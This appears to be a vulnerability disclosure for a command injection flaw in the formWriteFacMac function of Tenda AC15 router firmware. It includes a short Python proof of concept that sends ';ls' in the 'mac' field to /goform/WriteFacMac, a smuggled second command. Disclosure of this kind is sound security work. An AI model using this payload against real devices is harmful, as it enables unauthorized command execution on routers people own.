## Overview

- Firmware download website: https://www.tendacn.com/us/download/detail-3851.html

## Affected version

AC15V1.0 V15.03.20_multi

## Vulnerability details

The Tenda AC15V1.0 V15.03.20_multi firmware, we discovered a command injection vulnerablility in `formWriteFacMac` function in the `v3` parameter and the `mac` varable is directly passed to a `doSystemCmd` function, causing an arbitrary command execution. The user-provided `mac` can trigger this security vulnerability.

![image-20240314181142582](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240314181142582.png)

## POC

```python
import requests
from pwn import*

ip = "192.168.84.101"
url = "http://" + ip + "/goform/WriteFacMac"
payload = ";ls"

data = {"mac": payload}
response = requests.post(url, data=data)
print(response.text)
```

![image-20240313164800839](https://raw.githubusercontent.com/abcdefg-png/images/main/image-20240313164800839.png)
